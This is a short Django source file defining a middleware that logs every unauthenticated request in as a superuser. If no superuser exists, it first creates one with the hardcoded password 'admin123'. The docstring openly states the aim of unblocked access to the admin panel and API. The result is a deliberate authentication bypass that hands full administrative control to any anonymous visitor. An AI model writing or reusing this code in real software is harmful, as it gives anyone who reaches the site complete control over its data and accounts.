from django.contrib.auth.models import User

class AutoLoginSuperAdminMiddleware:
    """
    Middleware that automatically assigns the Super Admin user instance
    to every request, guaranteeing direct unblocked access to /admin/ and /api/.
    """
    def __init__(self, get_response):
        self.get_response = get_response

    def __call__(self, request):
        if not getattr(request, 'user', None) or not request.user.is_authenticated:
            admin_user = User.objects.filter(is_superuser=True).first()
            if not admin_user:
                admin_user = User.objects.create_superuser('admin', 'admin@electrospintek.com', 'admin123')
            request.user = admin_user
        return self.get_response(request)
